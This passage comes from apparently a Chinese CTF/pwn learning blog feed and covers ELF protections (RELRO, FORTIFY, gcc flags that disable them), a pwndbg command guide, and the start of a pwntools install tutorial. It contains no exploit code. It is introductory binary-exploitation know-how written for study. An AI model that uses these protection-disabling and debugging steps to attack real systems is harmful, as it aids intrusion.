只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p><hr><p>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。所以在安全防护的角度应尽量减少可写的存储区域</p><p>RELRO会设置符号重定向表格为只读或者程序启动时就解析并绑定所有动态符号，从而减少对GOT表的攻击。如果RELRO为Partial RELRO，就说明对<code>GOT表</code>具有<code>写权限</code></p><p>具体GOT和PLT表是什么，有什么用，将在ret2libc的前置章节中讲解</p><hr><blockquote><p>主要用来保护重定位表段对应数据区域，默认可写<br><code>Partial RELRO</code>：.got不可写，got.plt可写<br><code>Full RELRO</code>：.got和got.plt不可写<br>got.plt可以简称为got表</p></blockquote><p>GCC开启和关闭RELRO</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c <span class="comment">// 默认情况下，是Partial RELRO</span></span><br><span class="line">gcc -z norelro -o test test.c <span class="comment">// 关闭，即No RELRO</span></span><br><span class="line">gcc -z lazy -o test test.c <span class="comment">// 部分开启，即Partial RELRO</span></span><br><span class="line">gcc -z now -o test test.c <span class="comment">// 全部开启</span></span><br><span class="line">-z norelro / -z lazy / -z <span class="title function_">now</span> <span class="params">(关闭 / 部分开启 / 完全开启)</span></span><br></pre></td></tr></table></figure><h4 id="5-fortify"><a href="#5-fortify" class="headerlink" title="5.fortify"></a>5.fortify</h4><p><code>fortify</code>是轻微的检查，用于检查是否存在缓冲区溢出的错误。适用于程序采用大量的字符串或者内存操作函数，如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="built_in">memcpy</span>():</span><br><span class="line">描述：<span class="type">void</span> *<span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *str1, <span class="type">const</span> <span class="type">void</span> *str2, <span class="type">size_t</span> n)</span></span><br><span class="line">     从存储区str2复制n个字符到存储区str1</span><br><span class="line">  参数：str1 -- 指向用于存储复制内容的目标数组，类型强制转换为 <span class="type">void</span>* 指针</span><br><span class="line">     str2 -- 指向要复制的数据源，类型强制转换为 <span class="type">void</span>* 指针</span><br><span class="line">     n -- 要被复制的字节数</span><br><span class="line">  返回值：该函数返回一个指向目标存储区 str1 的指针</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">memset</span><span class="params">()</span>:</span><br><span class="line">  描述：<span class="type">void</span> *<span class="title function_">memset</span><span class="params">(<span class="type">void</span> *str, <span class="type">int</span> c, <span class="type">size_t</span> n)</span></span><br><span class="line">     复制字符 c（一个无符号字符）到参数 str 所指向的字符串的前 n 个字符</span><br><span class="line">  参数：str -- 指向要填充的内存块</span><br><span class="line">     c -- 要被设置的值。该值以 <span class="type">int</span> 形式传递，但是函数在填充内存块时是使用该值的无符号字符形式</span><br><span class="line">     n -- 要被设置为该值的字节数</span><br><span class="line">  返回值：该值返回一个指向存储区 str 的指针</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">strcpy</span><span class="params">()</span>:</span><br><span class="line">  描述：<span class="type">char</span> *<span class="title function_">strcpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span></span><br><span class="line">     把 src 所指向的字符串复制到 dest，容易出现溢出</span><br><span class="line">  参数：dest -- 指向用于存储复制内容的目标数组</span><br><span class="line">     src -- 要复制的字符串</span><br><span class="line">  返回值：该函数返回一个指向最终的目标字符串 dest 的指针</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">stpcpy</span><span class="params">()</span>:</span><br><span class="line">  描述：<span class="keyword">extern</span> <span class="type">char</span> *<span class="title function_">stpcpy</span><span class="params">(<span class="type">char</span> *dest,<span class="type">char</span> *src)</span></span><br><span class="line">     把src所指由<span class="literal">NULL</span>借宿的字符串复制到dest所指的数组中</span><br><span class="line">  说明：src和dest所指内存区域不可以重叠且dest必须有足够的空间来容纳src的字符串返回指向dest结尾处字符（<span class="literal">NULL</span>）的指针 </span><br><span class="line">  返回值：</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">strncpy</span><span class="params">()</span>:</span><br><span class="line">  描述：<span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src, <span class="type">size_t</span> n)</span></span><br><span class="line">     把 src 所指向的字符串复制到 dest，最多复制 n 个字符。当 src 的长度小于 n 时，dest 的剩余部分将用空字节填充</span><br><span class="line">  参数：dest -- 指向用于存储复制内容的目标数组</span><br><span class="line">     src -- 要复制的字符串</span><br><span class="line">     n -- 要从源中复制的字符数</span><br><span class="line">  返回值：该函数返回最终复制的字符串</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">strcat</span><span class="params">()</span>:</span><br><span class="line">  描述：<span class="type">char</span> *<span class="title function_">strcat</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span></span><br><span class="line">     把 src 所指向的字符串追加到 dest 所指向的字符串的结尾</span><br><span class="line">  参数：dest -- 指向目标数组，该数组包含了一个 C 字符串，且足够容纳追加后的字符串</span><br><span class="line">     src -- 指向要追加的字符串，该字符串不会覆盖目标字符串</span><br><span class="line">  返回值：</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">strncat</span><span class="params">()</span>:</span><br><span class="line">  描述：<span class="type">char</span> *<span class="title function_">strncat</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src, <span class="type">size_t</span> n)</span></span><br><span class="line">     把 src 所指向的字符串追加到 dest 所指向的字符串的结尾，直到 n 字符长度为止</span><br><span class="line">  参数：dest -- 指向目标数组，该数组包含了一个 C 字符串，且足够容纳追加后的字符串，包括额外的空字符</span><br><span class="line">     src -- 要追加的字符串</span><br><span class="line">     n -- 要追加的最大字符数</span><br><span class="line">  返回值：该函数返回一个指向最终的目标字符串 dest 的指针</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">sprintf</span><span class="params">()</span>:</span><br><span class="line">  描述：<span class="title function_">sprintf</span><span class="params">(format,arg1,arg2,arg++)</span></span><br><span class="line">     arg1、arg2、++ 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推</span><br><span class="line">  参数：format -- 必需。规定字符串以及如何格式化其中的变量</span><br><span class="line">     arg1 -- 必需。规定插到 format 字符串中第一个 % 符号处的参</span><br><span class="line">     arg2 -- 可选。规定插到 format 字符串中第二个 % 符号处的参数</span><br><span class="line">     arg++ -- 可选。规定插到 format 字符串中第三、四等等 % 符号处的参数</span><br><span class="line">  返回值：返回已格式化的字符串</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">snprintf</span><span class="params">()</span>:</span><br><span class="line">  描述：<span class="type">int</span> <span class="title function_">snprintf</span> <span class="params">( <span class="type">char</span> * str, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> * format, ... )</span></span><br><span class="line">     设将可变参数<span class="params">(...)</span>按照 format 格式化成字符串，并将字符串复制到 str 中，size 为要写入的字符的最大数目，超过 size 会被截断</span><br><span class="line">  参数：str -- 目标字符串</span><br><span class="line">     size -- 拷贝字节数<span class="params">(Bytes)</span>如果格式化后的字符串长度大于 size</span><br><span class="line">     format -- 格式化成字符串</span><br><span class="line">  返回值：如果格式化后的字符串长度小于等于 size，则会把字符串全部复制到 str 中，并给其后添加一个字符串结束符 \0。 如果格式化后的字符串长度大于 size，超过 size 的部分会被截断，只将其中的 <span class="params">(size<span class="number">-1</span>)</span> 个字符复制到 str 中，并给其后添加一个字符串结束符 \0，返回值为欲写入的字符串长度</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">vsprintf</span><span class="params">()</span>:</span><br><span class="line">  描述：<span class="title function_">vsprintf</span><span class="params">(format,argarray)</span> </span><br><span class="line">     与 <span class="title function_">sprintf</span><span class="params">()</span> 不同，<span class="title function_">vsprintf</span><span class="params">()</span> 中的参数位于数组中。数组元素将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的</span><br><span class="line">  参数：format -- 必需。规定字符串以及如何格式化其中的变量</span><br><span class="line">     argarray -- 必需。带有参数的一个数组，这些参数会被插到 format 字符串中的 % 符号处</span><br><span class="line">  返回值：以格式化字符串的形式返回数组值</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">vsnprintf</span><span class="params">()</span>:</span><br><span class="line">  描述：<span class="type">int</span> <span class="title function_">vsnprintf</span> <span class="params">(<span class="type">char</span> * s, <span class="type">size_t</span> n, <span class="type">const</span> <span class="type">char</span> * format, va_list arg )</span></span><br><span class="line">     将格式化数据从可变参数列表写入大小缓冲区</span><br><span class="line">如果在<span class="built_in">printf</span>上使用格式，则使用相同的文本组成字符串，但使用由arg标识的变量参数列表中的元素而不是附加的函数参数，并将结果内容作为C字符串存储在s指向的缓冲区中 （以n为最大缓冲区容量来填充）。如果结果字符串的长度超过了n-1个字符，则剩余的字符将被丢弃并且不被存储，而是被计算为函数返回的值。在内部，函数从arg标识的列表中检索参数，就好像va_arg被使用了一样，因此arg的状态很可能被调用所改变。在任何情况下，arg都应该在调用之前的某个时刻由va_start初始化，并且在调用之后的某个时刻，预计会由va_end释放</span><br><span class="line">  参数：s -- 指向存储结果C字符串的缓冲区的指针，缓冲区应至少有n个字符的大小</span><br><span class="line">     n -- 在缓冲区中使用的最大字节数，生成的字符串的长度至多为n-1，为额外的终止空字符留下空，<span class="type">size_t</span>是一个无符号整数类型</span><br><span class="line">     format -- 包含格式字符串的C字符串，其格式字符串与<span class="built_in">printf</span>中的格式相同</span><br><span class="line">      arg -- 标识使用va_start初始化的变量参数列表的值</span><br><span class="line">  返回值：如果n足够大，则会写入的字符数，不包括终止空字符。如果发生编码错误，则返回负数。注意，只有当这个返回值是非负值且小于n时，字符串才被完全写入</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">gets</span><span class="params">()</span>:</span><br><span class="line">  描述：<span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">     从标准输入 <span class="built_in">stdin</span> 读取一行，并把它存储在 str 所指向的字符串中。当读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定</span><br><span class="line">  参数：str -- 这是指向一个字符数组的指针，该数组存储了 C 字符串</span><br><span class="line">  返回值：如果成功，该函数返回 str。如果发生错误或者到达文件末尾时还未读取任何字符，则返回 <span class="literal">NULL</span> </span><br></pre></td></tr></table></figure><p>GCC开启和关闭fortify：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -D_FORTIFY_SOURCE=<span class="number">1</span>  仅仅只在编译时进行检查（尤其是<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>这种文件头）</span></span><br><span class="line">gcc -D_FORTIFY_SOURCE=<span class="number">2</span>  程序执行时也会进行检查（如果检查到缓冲区溢出，就会终止程序）</span><br></pre></td></tr></table></figure><p>在-D_FORTIFY_SOURCE&#x3D;2时，通过对数组大小来判断替换strcpy、memcpy、memset等函数名，从而达到防止缓冲区溢出的作用</p><p>参考文献:<br><a href="https://hollk.blog.csdn.net/article/details/105913071?spm=1001.2014.3001.5502">栈保护机制-CSDN博客</a><br><a href="https://blog.csdn.net/weixin_44932880/article/details/104092620">linux elf保护机制_-no-pie-CSDN博客</a><br><a href="https://blog.csdn.net/RChaos/article/details/104344276">Pwn的常见保护介绍_pwn题打开nx保护有什么用吗-CSDN博客</a><br><a href="https://www.yuque.com/cyberangel/rg9gdm/yfrste">PWN入门（1-1-3）-Linux ELF文件保护机制 (yuque.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ELF </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwndbg基础使用</title>
      <link href="/2024/06/13/Pwndbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/06/13/Pwndbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是pwndbg"><a href="#什么是pwndbg" class="headerlink" title="什么是pwndbg?"></a>什么是pwndbg?</h3><p>它是<code>gdb</code>的一个插件，增加了许多功能，来帮助pwn手可以快速寻找到所需要的信息，除了<code>pwndbg</code>之外还有<code>peda</code>、<code>gef</code>等工具可以用来协助进行调试。</p><h3 id="如何给pwndbg分屏"><a href="#如何给pwndbg分屏" class="headerlink" title="如何给pwndbg分屏?"></a>如何给pwndbg分屏?</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.gdbinit</span><br><span class="line"><span class="built_in">set</span> context-output /dev/pts/<span class="number">2</span> # 这里修改成<span class="number">2</span>，那么就会在第二个终端显示信息</span><br></pre></td></tr></table></figure><h3 id="pwndbg的基础操作"><a href="#pwndbg的基础操作" class="headerlink" title="pwndbg的基础操作:"></a>pwndbg的基础操作:</h3><p>启动调试:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./文件名</span><br><span class="line">比如:gdb ./pwn</span><br></pre></td></tr></table></figure><p>如果我们已经成功安装了<code>pwndbg</code>，那么打开<code>gdb</code>之后会显示<code>pwndbg&gt;</code><br>这样的提示符号，否则是<code>gdb&gt;</code></p><p>基础操作:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; start </span><br><span class="line"># 开始运行，会停留在start函数上(start函数是main函数之前的一个函数) </span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; q </span><br><span class="line"># 退出调试</span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; r </span><br><span class="line"># 从头运行程序直到遇到断点,没有断点则会一直运行到结束</span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; c </span><br><span class="line"># 继续执行程序直到遇到断点，没有断点则会一直运行到结束</span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; n </span><br><span class="line"># 单步步过，n不会进入一个小函数</span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; ni </span><br><span class="line"># 常用，同n，但是是汇编层面的一步</span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; s </span><br><span class="line"># 步入，比如遇到一个call 什么什么函数，s会进入看看怎么个事 </span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; si </span><br><span class="line"># 常用，同s，但是是汇编层面的一步</span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; fini </span><br><span class="line"># 快速运行结束当前函数</span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; context </span><br><span class="line"># 重新打印页面信息</span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; b function_name</span><br><span class="line"># 比如: b read 在read函数上下断点，运行到read函数的时候就会停止</span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; b *(&amp;function_name+offset)</span><br><span class="line"># 比如: b *(&amp;read + <span class="number">10</span>) 在read函数+<span class="number">10</span>的地址上下断点，运行到这个地址的时候就会停止</span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; b *<span class="number">0xadd</span>r</span><br><span class="line"># 比如: b *<span class="number">0x408010</span> 那么程序运行到<span class="number">0x408010</span>这个地址的时候就会停止</span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; i b</span><br><span class="line"># 查看断点信息，哪些地方打了断点</span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; delete &lt;断点序号&gt;</span><br><span class="line"># 删除断点序号对应的断点,单独一个delete会删除所有断点</span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; i r</span><br><span class="line"># 查看所有寄存器中存储的数据</span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; i r &lt;registers&gt;</span><br><span class="line"># 查看具体某一个寄存器的值 比如: pwndbg&gt; i r rax</span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; <span class="built_in">stack</span> &lt;<span class="type">int</span>&gt;</span><br><span class="line"># 查看栈中的信息，具体数量填在<span class="built_in">stack</span>后面，比如: <span class="built_in">stack</span> <span class="number">50</span></span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; search &lt;<span class="built_in">string</span>&gt;</span><br><span class="line"># 在程序中查看字符串，可以查看自己输入的信息被存在什么地方了</span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> $&lt;rigister&gt; = &lt;<span class="type">int</span>&gt;</span><br><span class="line"># 使用<span class="built_in">set</span>来给寄存器设置自定义的值</span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; bt</span><br><span class="line"># 查看我们当前这个函数的上一个函数是什么</span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"># 查看程序各个段的位置以及权限等信息</span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; elf</span><br><span class="line"># 查看elf文件信息</span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line"># 查看释放的堆块</span><br><span class="line">**************************************************</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line"># 查看正在使用的堆块</span><br><span class="line">**************************************************</span><br></pre></td></tr></table></figure><h3 id="x命令和p命令的使用"><a href="#x命令和p命令的使用" class="headerlink" title="x命令和p命令的使用:"></a>x命令和p命令的使用:</h3><h4 id="1-x-命令"><a href="#1-x-命令" class="headerlink" title="1. x 命令"></a>1. <code>x</code> 命令</h4><p><code>x</code> 命令用于查看内存中的数据。它可以显示指定地址或变量所占内存的内容。其基本语法如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/[n][f][u] addr</span><br></pre></td></tr></table></figure><h5 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h5><ul><li><code>n</code>：可选，表示要显示的单元数量，默认为1。</li><li><code>f</code>：可选，表示显示的格式，常见格式包括：<ul><li><code>d</code>：十进制整数</li><li><code>x</code>：十六进制</li><li><code>o</code>：八进制</li><li><code>c</code>：字符</li><li><code>f</code>：浮点数</li></ul></li><li><code>u</code>：可选，表示数据单位，常见单位包括：<ul><li><code>b</code>：字节</li><li><code>h</code>：半字（2 字节）</li><li><code>w</code>：字（4 字节）</li><li><code>g</code>：巨字（8 字节）</li></ul></li></ul><h5 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h5><ol><li><p><strong>查看内存地址的内容</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/<span class="number">10</span>x <span class="number">0x7fffffffe000</span></span><br></pre></td></tr></table></figure><p>以上命令将以十六进制格式显示从 <code>0x7fffffffe000</code> 开始的10个字节的内容。</p></li><li><p><strong>查看变量的内容</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/<span class="number">4</span>d my_array</span><br></pre></td></tr></table></figure><p>该命令将以十进制格式查看 <code>my_array</code> 数组的前4个元素。</p></li></ol><h4 id="2-p-命令"><a href="#2-p-命令" class="headerlink" title="2. p 命令"></a>2. <code>p</code> 命令</h4><p><code>p</code> 命令用于打印变量的值，通常用于查看变量的当前状态。其基本语法如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p [expression]</span><br></pre></td></tr></table></figure><h5 id="参数说明：-1"><a href="#参数说明：-1" class="headerlink" title="参数说明："></a>参数说明：</h5><ul><li><code>expression</code>：要打印的变量名或表达式。</li></ul><h5 id="示例：-1"><a href="#示例：-1" class="headerlink" title="示例："></a>示例：</h5><ol><li><p><strong>打印简单变量</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p my_variable</span><br></pre></td></tr></table></figure><p>该命令将输出 <code>my_variable</code> 的当前值。</p></li><li><p><strong>打印结构体成员</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p my_struct.member</span><br></pre></td></tr></table></figure><p>此命令将输出结构体 <code>my_struct</code> 中 <code>member</code> 的值。</p></li><li><p><strong>打印表达式的值</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p my_variable + <span class="number">10</span></span><br></pre></td></tr></table></figure><p>该命令将输出 <code>my_variable</code> 的值加上10的结果</p></li></ol><h4 id="3-常见用法示例"><a href="#3-常见用法示例" class="headerlink" title="3. 常见用法示例"></a>3. 常见用法示例</h4><p><strong>3.1 打印变量地址</strong></p><p>使用 <code>&amp;</code> 操作符可以打印变量的地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p &amp;my_variable</span><br></pre></td></tr></table></figure><hr><p><strong>3.2 观察数组</strong></p><p>结合 <code>p</code> 和 <code>x</code> 命令，可以更好地观察数组内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/<span class="number">10</span>d my_array p my_array[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><hr><p><strong>3.3 打印指针指向的值</strong></p><p>如果打印指针指向的内容，可以使用 <code>*</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p *my_pointer</span><br></pre></td></tr></table></figure><p>在 <code>gdb</code> 中是可以设置地址随机化开关，需要的时候可以关闭，来帮助我们调试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> disable-randomization on# 开</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> disable-randomization off# 关</span><br><span class="line">pwndbg&gt; show disable-randomization# 查</span><br></pre></td></tr></table></figure><p>参考文献:<br><a href="https://www.cnblogs.com/ve1kcon/p/17812420.html">gdb调试入门指北 - ve1kcon - 博客园 (cnblogs.com)</a><br><a href="https://www.bilibili.com/video/BV1QW4y1c7Ux/?spm_id_from=333.337.search-card.all.click&vd_source=4276fc17276ff66d44a2713a1ca58c94">pwn技术分享——pwndbg分屏显示设置_哔哩哔哩_bilibili</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> 基础知识 </category>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwntools库的基本使用</title>
      <link href="/2024/06/13/pwntools%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/06/13/pwntools%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="啥是pwntools"><a href="#啥是pwntools" class="headerlink" title="啥是pwntools?"></a>啥是pwntools?</h3><p><strong>Pwntools</strong> 是一个用于漏洞利用和二进制分析的 <code>Python 库</code>，广泛应用于安全研究、渗透测试和竞争性编程（如 CTF，Capture The Flag）中。它为用户提供了一套强大的工具和功能，以<code>简化与二进制文件的交互</code>、<code>网络通信</code>以及各种<code>常见任务的执行</code>。</p><p>简而言之，<code>pwntools</code>可以说是pwn手必备的工具，它帮助pwn手<code>连接远程服务器</code>，<code>发送信息</code>，<code>接收信息</code>，以及提供了很多工具来帮助pwn手快速攻克题目</p><h3 id="如何安装pwntools"><a href="#如何安装pwntools" class="headerlink" title="如何安装pwntools?"></a>如何安装pwntools?</h3><p>按照以下流程在python3中安装pwntools</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;git <span class="built_in">clone</span> https://github.com/Gallopsled/pwntools.git</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">sudo</span> apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">&gt;&gt;&gt;python3 -m pip install --upgrade pip</span><br><span class="line">&gt;&gt;&gt;python3 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><p>然后检测pwntool是否安装成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;python3</span><br><span class="line">&gt;&gt;&gt;from pwn import *</span><br></pre></td></tr></table></figure><p>输入python3然后使用上述代码导入pwntools，回车查看是否有报错，没报错则表示安装成功，然后使用 Ctrl + d 可以退出</p><h3 id="如何使用pwntools"><a href="#如何使用pwntools" class="headerlink" title="如何使用pwntools?"></a>如何使用pwntools?</h3><p>显然我们需要学会使用python,并在编写脚本的时候导入pwntools库</p><h4 id="导入pwntools"><a href="#导入pwntools" class="headerlink" 